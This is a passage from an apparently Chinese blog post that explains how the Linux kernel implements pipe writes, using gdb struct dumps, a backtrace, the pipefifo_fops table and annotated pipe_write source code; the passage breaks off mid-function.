= &#123;</span></span><br><span class="line"><span class="comment">      &#123;</span></span><br><span class="line"><span class="comment">        rlock = &#123;</span></span><br><span class="line"><span class="comment">          raw_lock = &#123;</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              val = &#123;</span></span><br><span class="line"><span class="comment">                counter = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked = 0x0,</span></span><br><span class="line"><span class="comment">                pending = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">                tail = 0x0</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    osq = &#123;</span></span><br><span class="line"><span class="comment">      tail = &#123;</span></span><br><span class="line"><span class="comment">        counter = 0x0</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    wait_list = &#123;</span></span><br><span class="line"><span class="comment">      next = 0xffff888004f72e50,</span></span><br><span class="line"><span class="comment">      prev = 0xffff888004f72e50</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  rd_wait = &#123;</span></span><br><span class="line"><span class="comment">    lock = &#123;</span></span><br><span class="line"><span class="comment">      &#123;</span></span><br><span class="line"><span class="comment">        rlock = &#123;</span></span><br><span class="line"><span class="comment">          raw_lock = &#123;</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              val = &#123;</span></span><br><span class="line"><span class="comment">                counter = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked = 0x0,</span></span><br><span class="line"><span class="comment">                pending = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">                tail = 0x0</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    head = &#123;</span></span><br><span class="line"><span class="comment">      next = 0xffff888004f72e68,</span></span><br><span class="line"><span class="comment">      prev = 0xffff888004f72e68</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  wr_wait = &#123;</span></span><br><span class="line"><span class="comment">    lock = &#123;</span></span><br><span class="line"><span class="comment">      &#123;</span></span><br><span class="line"><span class="comment">        rlock = &#123;</span></span><br><span class="line"><span class="comment">          raw_lock = &#123;</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              val = &#123;</span></span><br><span class="line"><span class="comment">                counter = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked = 0x0,</span></span><br><span class="line"><span class="comment">                pending = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">                tail = 0x0</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    head = &#123;</span></span><br><span class="line"><span class="comment">      next = 0xffff888004f72e80,</span></span><br><span class="line"><span class="comment">      prev = 0xffff888004f72e80</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  head = 0x0,</span></span><br><span class="line"><span class="comment">  tail = 0x0,</span></span><br><span class="line"><span class="comment">  max_usage = 0x10,</span></span><br><span class="line"><span class="comment">  ring_size = 0x10,</span></span><br><span class="line"><span class="comment">  nr_accounted = 0x10,</span></span><br><span class="line"><span class="comment">  readers = 0x0,</span></span><br><span class="line"><span class="comment">  writers = 0x0,</span></span><br><span class="line"><span class="comment">  files = 0x0,</span></span><br><span class="line"><span class="comment">  r_counter = 0x1,</span></span><br><span class="line"><span class="comment">  w_counter = 0x1,</span></span><br><span class="line"><span class="comment">  tmp_page = 0x0 &lt;fixed_percpu_data&gt;,</span></span><br><span class="line"><span class="comment">  fasync_readers = 0x0 &lt;fixed_percpu_data&gt;,</span></span><br><span class="line"><span class="comment">  fasync_writers = 0x0 &lt;fixed_percpu_data&gt;,</span></span><br><span class="line"><span class="comment">  bufs = 0xffff888004364800,</span></span><br><span class="line"><span class="comment">  user = 0xffff888004396e80</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<h4 id="9、struct-file-operations-pipefifo-fops"><a href="#9、struct-file-operations-pipefifo-fops" class="headerlink" title="9、struct file_operations pipefifo_fops"></a>9、struct file_operations pipefifo_fops</h4><p>上面第5节，<code>get_pipe_inode</code>函数将<code>inode-&gt;i_fop</code> 赋值为<code>&amp;pipefifo_fops</code>；作用是确定pipe的操作函数。比如<code>pipe_read</code>为读管道的操作，而<code>pipe_write</code>为写管道的操作。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">	.open		= fifo_open,</span><br><span class="line">	.llseek		= no_llseek,</span><br><span class="line">	.read_iter	= pipe_read,</span><br><span class="line">	.write_iter	= pipe_write,</span><br><span class="line">	.poll		= pipe_poll,</span><br><span class="line">	.unlocked_ioctl	= pipe_ioctl,</span><br><span class="line">	.release	= pipe_release,</span><br><span class="line">	.fasync		= pipe_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>也可以通过调试的方式进行验证，我们在<code>pipe_write</code>函数下断点，运行在断点停止后查看函数调用栈。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  bt</span><br><span class="line"><span class="comment">#0  pipe_write (iocb=0xffffc9000036fe88, from=0xffffc9000036fe60) at fs/pipe.c:402</span></span><br><span class="line"><span class="comment">#1  0xffffffff811edfe1 in call_write_iter (iter=0xffffc9000036fe60, kio=0xffffc9000036fe88, file=0xffff88800415aa00) at ./include/linux/fs.h:1901</span></span><br><span class="line"><span class="comment">#2  new_sync_write (filp=filp@entry=0xffff88800415aa00, buf=buf@entry=0x559db68020e0 &quot;&quot;, len=len@entry=0x1000, ppos=ppos@entry=0x0 &lt;fixed_percpu_data&gt;) at fs/read_write.c:518</span></span><br><span class="line"><span class="comment">#3  0xffffffff811f06e3 in vfs_write (file=file@entry=0xffff88800415aa00, buf=buf@entry=0x559db68020e0 &quot;&quot;, count=count@entry=0x1000, pos=pos@entry=0x0 &lt;fixed_percpu_data&gt;) at fs/read_write.c:605</span></span><br><span class="line"><span class="comment">#4  0xffffffff811f0a92 in ksys_write (fd=&lt;optimized out&gt;, buf=0x559db68020e0 &quot;&quot;, count=0x1000) at fs/read_write.c:658</span></span><br><span class="line"><span class="comment">#5  0xffffffff81b9f553 in do_syscall_64 (nr=&lt;optimized out&gt;, regs=0xffffc9000036ff58) at arch/x86/entry/common.c:46</span></span><br><span class="line"><span class="comment">#6  0xffffffff81c0007c in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:120</span></span><br><span class="line"><span class="comment">#7  0x0000000000000000 in ?? ()</span></span><br></pre></td></tr></table></figure>

<p>我们知道kernel中对文件读写的函数为<code>vfs_read</code>和<code>vfs_write</code>。当满足一定条件时将会出现如下函数调用：<code>vfs_write</code>-&gt;<code>new_sync_write</code>-&gt;<code>call_write_iter</code>。观察<code>call_write_iter</code>函数实现。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">ssize_t</span> <span class="title">call_write_iter</span><span class="params">(struct file *file, struct kiocb *kio,</span></span></span><br><span class="line"><span class="params"><span class="function">				      struct iov_iter *iter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> file-&gt;f_op-&gt;<span class="built_in">write_iter</span>(kio, iter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里根据<code>write_iter</code>来确定函数调用，由于在上面的结构体中已经为其赋值，所以当对管道进行写操作时，将会调用<code>pipe_write</code>函数。</p>
<h4 id="10、pipe-write"><a href="#10、pipe-write" class="headerlink" title="10、pipe_write"></a>10、pipe_write</h4><p>当写进程向管道中写入时，它利用标准的库函数write()，系统根据库函数传递的文件描述符，可找到该文件的 file 结构。<br>file 结构中指定了用来进行写操作的函数（即写入函数）地址，于是，内核调用该函数完成写操作。<br>写入函数在向内存中写入数据之前，必须首先检查 VFS 索引节点中的信息，同时满足如下条件时，才能进行实际的内存复制工作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内存中有足够的空间可容纳所有要写入的数据；</span><br><span class="line">内存没有被读程序锁定。</span><br></pre></td></tr></table></figure>

<p>如果同时满足上述条件，写入函数首先锁定内存，然后从写进程的地址空间中复制数据到内存。<br>否则，写入进程就休眠在 VFS 索引节点的等待队列中，接下来，内核将调用调度程序，而调度程序会选择其他进程运行。<br>写入进程实际处于可中断的等待状态，当内存中有足够的空间可以容纳写入数据，<br>或内存被解锁时，读取进程会唤醒写入进程，这时，写入进程将接收到信号。<br>当数据写入内存之后，内存被解锁，而所有休眠在索引节点的读取进程会被唤醒。</p>
<p>管道的读取过程和写入过程类似。但是，进程可以在没有数据或内存被锁定时立即返回错误信息，而不是阻塞该进程，<br>这依赖于文件或管道的打开模式。反之，进程可以休眠在索引节点的等待队列中等待写入进程写入数据。<br>当所有的进程完成了管道操作之后，管道的索引节点被丢弃，而共享数据页也被释放</p>
<p>推荐看下linux0.12内核对管道的实现，实现的思想是类似的，也便于对代码的理解。笔者在下面也贴出了0.12代码对pipe_write的实现。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pipe_write</span>(struct kiocb *iocb, struct iov_iter *from)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;			<span class="comment">// 调试打印该变量值，发现就是上面通过alloc_pipe_info函数生成的pipe</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> total_len = <span class="built_in">iov_iter_count</span>(from);</span><br><span class="line">	<span class="keyword">ssize_t</span> chars;</span><br><span class="line">	<span class="keyword">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Null write succeeds. */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(total_len == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	__pipe_lock(pipe);				<span class="comment">// 对pipe加互斥锁，保证单线程访问。</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pipe-&gt;readers) &#123;			<span class="comment">// 这里要保证读取管道的任务不为0</span></span><br><span class="line">		<span class="built_in">send_sig</span>(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">		ret = -EPIPE;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">		ret = -EXDEV;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Only wake up if the pipe started out empty, since</span></span><br><span class="line"><span class="comment">	 * otherwise there should be no readers waiting.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * If it wasn&#x27;t empty we try to merge new data into</span></span><br><span class="line"><span class="comment">	 * the last buffer.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * That naturally merges small writes, but it also</span></span><br><span class="line"><span class="comment">	 * page-aligs the rest of the writes for large writes</span></span><br><span class="line"><span class="comment">	 * spanning multiple pages.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 仅当管道开始为空时才唤醒，否则不应有读者在等待。</span></span><br><span class="line"><span class="comment">    * 如果它不为空，我们会尝试将新数据合并到最后一个缓冲区中。</span></span><br><span class="line"><span class="comment">    * 这自然会合并小型写入，但它也会为跨多个页面的大型写入对其余写入进行页面对齐。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	head = pipe-&gt;head;				<span class="comment">// 0x0												</span></span><br><span class="line">	was_empty = <span class="built_in">pipe_empty</span>(head, pipe-&gt;tail);		<span class="comment">// 判断管道头尾指针是否相等，如果相等则管道为空。</span></span><br><span class="line">	chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);						<span class="comment">// 0x38</span></span><br><span class="line">	<span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;			<span class="comment">// 0xf</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];		<span class="comment">// pipe-&gt;bufs[0x10 &amp; 0xf]	0x10 &amp; 0xf == 0</span></span><br><span class="line">		<span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;		<span class="comment">// 0x4</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">			ret = <span class="built_in">pipe_buf_confirm</span>(pipe, buf);</span><br><span class="line">			<span class="keyword">if</span> (ret)</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">			ret = <span class="built_in">copy_page_from_iter</span>(buf-&gt;page, offset, chars, from);</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">unlikely</span>(ret &lt; chars)) &#123;</span><br><span class="line">				ret = -EFAULT;</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			buf-&gt;len += ret;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">iov_iter_count</span>(from))</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!pipe-&gt;readers) &#123;						<span class="comment">// 如果pipe的读者数量为0，则发送信号，直到有读者。</span></span><br><span class="line">			<span class="built_in">send_sig</span>(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (!ret)</span><br><span class="line">				ret = -EPIPE;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		head = pipe-&gt;head;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">pipe_full</span>(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;			<span class="comment">// 如果pipe没有被填满</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;			<span class="comment">// 0xf</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];		<span class="comment">// 所有成员均为0</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;		<span class="comment">// 0x0</span></span><br><span class="line">			<span class="keyword">int</span> copied;			</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!page) &#123;																		<span class="comment">// 如果缓存页为空，这里的作用是为pipe-&gt;tmp_page赋值为新分配的page</span></span><br><span class="line">				page = <span class="built_in">alloc_page</span>(GFP_HIGHUSER | __GFP_ACCOUNT);		<span class="comment">//调用 alloc_page 分配页，alloc_page 最终调用了 __alloc_pages_nodemask 函数从空闲列表中取出，或通过slowpath进行分配</span></span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">unlikely</span>(!page)) &#123;</span><br><span class="line">					ret = ret ? : -ENOMEM;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pipe-&gt;tmp_page = page;			</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Allocate a slot in the ring in advance and attach an</span></span><br><span class="line"><span class="comment">			 * empty buffer.  If we fault or otherwise fail to use</span></span><br><span class="line"><span class="comment">			 * it, either the reader will consume it or it&#x27;ll still</span></span><br><span class="line"><span class="comment">			 * be there for the next write.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="built_in">spin_lock_irq</span>(&amp;pipe-&gt;rd_wait.lock);						</span><br><span class="line"></span><br><span class="line">			head = pipe-&gt;head;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">pipe_full</span>(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">				<span class="built_in">spin_unlock_irq</span>(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">			<span class="built_in">spin_unlock_irq</span>(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">			buf = &amp;pipe-&gt;bufs[head &amp; mask];			<span class="comment">// </span></span><br><span class="line">			buf-&gt;page = page;</span><br><span class="line">			buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">is_packetized</span>(filp))							<span class="comment">// 这里实际判断的是 file-&gt;f_flags &amp; O_DIRECT， 而  O_DIRECT 的含义是是否可以直接访问磁盘</span></span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;		<span class="comment">// #define PIPE_BUF_FLAG_PACKET	0x08</span></span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;		<span class="comment">// #define PIPE_BUF_FLAG_CAN_MERGE	0x10</span></span><br><span class="line">			pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">			copied = <span class="built_in">copy_page_from_iter</span>(page, <span class="number">0</span>, PAGE_SIZE, from);		<span class="comment">// 调试发现某次执行的返回值为 0x1000</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">unlikely</span>(copied &lt; PAGE_SIZE &amp;&amp; <span class="built_in">iov_iter_count</span>(from))) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!ret)</span><br><span class="line">					ret = -EFAULT;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			ret += copied;				<span class="comment">// 0x0</span></span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">iov_iter_count</span>(from))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">pipe_full</span>(head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Wait for buffer space to become available. */</span></span><br><span class="line">		<span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!ret)</span><br><span class="line">				ret = -EAGAIN;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">signal_pending</span>(current)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!ret)</span><br><span class="line">				ret = -ERESTARTSYS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We&#x27;re going to release the pipe lock and wait for more</span></span><br><span class="line"><span class="comment">		 * space. We wake up any readers if necessary, and then</span></span><br><span class="line"><span class="comment">		 * after waiting we need to re-check whether the pipe</span></span><br><span class="line"><span class="comment">		 * become empty while we dropped the lock.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        我们将释放管道锁并等待更多空间。 如有必要，我们会唤醒任何读者，然后在等待之后，我们需要重新检查在我们丢弃锁时管道是否为空。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">		__pipe_unlock(pipe);</span><br><span class="line">		<span class="keyword">if</span> (was_empty) &#123;</span><br><span class="line">			<span class="built_in">wake_up_interruptible_sync_poll</span>(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">			<span class="built_in">kill_fasync</span>(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">wait_event_interruptible_exclusive</span>(pipe-&gt;wr_wait, <span class="built_in">pipe_writable</span>(pipe));</span><br><span class="line">		__pipe_lock(pipe);</span><br><span class="line">		was_empty = <span class="built_in">pipe_empty</span>(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">		wake_next_writer = <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">pipe_full</span>(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">		wake_next_writer = <span class="literal">false</span>;</span><br><span class="line">	__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we do do a wakeup event, we do a &#x27;sync&#x27; wakeup, because we</span></span><br><span class="line"><span class="comment">	 * want the reader to start processing things asap, rather than</span></span><br><span class="line"><span class="comment">	 * leave the data pending.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * This is particularly important for small writes, because of</span></span><br><span class="line"><span class="comment">	 * how (for example) the GNU make jobserver uses small writes to</span></span><br><span class="line"><span class="comment">	 * wake up pending jobs</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"> 